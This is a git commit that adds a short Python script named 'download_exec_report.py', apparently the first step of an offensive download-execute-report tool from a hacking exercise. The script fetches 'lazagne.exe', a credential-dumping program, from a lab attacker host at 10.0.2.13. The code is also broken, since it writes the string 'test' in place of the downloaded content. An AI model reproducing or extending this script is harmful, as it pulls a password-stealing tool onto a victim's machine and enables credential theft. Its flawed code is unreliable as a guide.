1907eb4a4b53162ccd22d3c9b417099a3bb0ba2c
syntax-eror <46492218+syntax-eror@users.noreply.github.com>
2019-07-24 18:45:48 -0700

    Create download_exec_report.py

---
+++ download_exec_report.py
@@ -0,0 +1,16 @@
+#!/usr/bin/env python3
+
+import requests #http requests through python
+
+def download(url):
+    get_response = requests.get(url)
+    file_name = url.split("/")[-1] #split with / as delim -1 for last element in list
+    #print(file_name)
+    #print(get_response) #returns response object
+    #print(get_response.content) #show content of response object
+    with open(file_name, "wb") as out_file: #wb - open file for writing as binary
+        out_file.write("test")
+
+download("http://10.0.2.13/hackfiles/lazagne.exe")
+#download("http://rarlab.com/rar/wrar571.exe")
+#download("http://vulnweb.com/acunetix-logo.png")
